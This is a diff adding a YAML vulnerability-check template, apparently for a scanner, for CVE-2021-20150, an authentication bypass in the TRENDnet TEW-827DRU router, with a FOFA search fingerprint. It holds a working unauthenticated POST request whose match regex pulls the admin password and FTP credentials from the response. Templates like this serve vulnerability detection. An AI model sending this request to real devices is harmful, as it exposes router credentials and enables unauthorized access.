@@ -1,0 +1,19 @@
+id: poc-yaml-trendnet-tew-827dru-identity-authentication-bypass
+info:
+  name: trendnet tew-827dru 身份认证绕过漏洞(CVE-2021-20150)
+  severity: medium
+  tags:
+  - 未授权访问
+  - CVE-2021-20150
+  finger: tew-827dru
+  fofa: body="tew-827dru"
+requests:
+- method: POST
+  path: /apply_sec.cgi
+  data: action=setup_wizard_cancel&html_response_page=ftpserver.asp&html_response_return_page=ftpserver.asp
+  expression: status_code == 200 && contains(body,"ftp_username") && contains(body,"ftp_password")
+    && contains(body,"ftp_permission") && contains(body,"TEW-827DRU") && matches(body,`<input
+    name="admin_passwd" type="password" id="admin_passwd" size="20" maxlength="15"
+    value ="(.*)" />`)
+variables: {}
+transport: http
